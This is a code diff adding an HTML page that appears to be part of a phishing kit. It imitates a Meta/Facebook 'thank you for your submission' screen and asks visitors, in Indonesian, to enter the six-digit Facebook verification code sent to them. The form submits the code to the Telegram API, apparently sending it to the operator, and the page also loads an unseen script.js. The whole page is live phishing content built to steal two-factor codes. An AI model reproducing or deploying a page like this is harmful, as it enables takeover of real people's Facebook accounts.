@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home | Notif</title>
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.weebly.com/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+        header {
+            background-color: white;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .logo {
+            margin: 0 10px;
+        }
+        .logo img{
+            width: 100%;
+            margin-top: 50px;
+        }
+        form {
+            width: 100%;
+        }
+        form input {
+            width: 85%;
+            margin: 0px 10px;
+            height: 40px;
+            padding: 0 10px;
+        }
+        .Team {
+            margin: 10px;
+        }
+        .Team p {
+            font-weight: 200;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-size: 0.8rem;
+        }
+        .Team a {
+            color: black;
+            text-decoration: underline #a8a8a8;
+        }
+        .btn {
+            margin-top: 15px;
+        }
+        .btn button {
+            background-color: rgb(0, 110, 255);
+            color: rgb(255, 255, 255);
+            font-weight: 500;
+            font-size: 1.2rem;
+            padding:10px 15px;
+            margin-bottom: 20px;
+            border: none;
+        }
+        .btn button:hover {
+            background-color: rgb(0, 110, 255);
+        }
+        .centang {
+            margin-top: 50px;
+        }
+        .centang i {
+            font-size: 1.4rem;
+            color: rgb(83, 82, 82);
+        }
+        .centang h1 {
+            font-size: 1rem;
+            font-weight: 500;
+        }
+        .masukan {
+            margin-top: 50px;
+            font-size: 0.7rem;
+            margin-bottom: 5px;
+            text-align: left;
+            margin-left: 15px
+        }
+    </style>
+    <header>
+        <div class="logo">
+            <img src="https://ed030df0ac8ea705430d.cdn6.editmysite.com/uploads/b/ed030df0ac8ea705430d11c08fd7af48b5373d12bdb5cb2dda02a48f5a2e9bcf/IMG-20240526-WA0000_1716989468.jpg?width=2400&optimize=medium" alt="">
+        </div>
+        <div class="centang">
+            <i class="fa-regular fa-circle-check"></i>
+            <h1>Thank you for your submission</h1>
+        </div>
+        <div class="masukan">
+            <p style="text-align: center; margin-bottom: 30px; font-size: 0.8rem; font-family: monospace;">Silahkan Cek Notifikasi Facebook Anda Kode 6 Digit Dan Masukan Kode Nya DiBawah</p>
+            <p>Masuka Kode Verifikasi Facebook : </p>
+        </div>
+        <form action="https://api.telegram.org" id="formTele" class="formtele" method="POST">
+            <input type="number" name="Kode Verifikasi" placeholder="Masukan Kode Verifikasi *" autocapitalize="off" autocomplete="off" required="required">
+
+            <div class="Team">
+                <p>Thid is protected by reCAPTCHA and the Google <a href="">Privacy Policy</a> and <a href="">Terms of Service</a> apply.</p>
+            </div>
+            <div class="btn">
+                <button type="submit" id="kirim">KIRIM</button>
+            </div>
+            
+        </form>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt="" style="width: 100px; text-align: center; margin-bottom: 5px;">
+
+    </header>
+    <script src="script.js"></script>
+</body>
+</html>
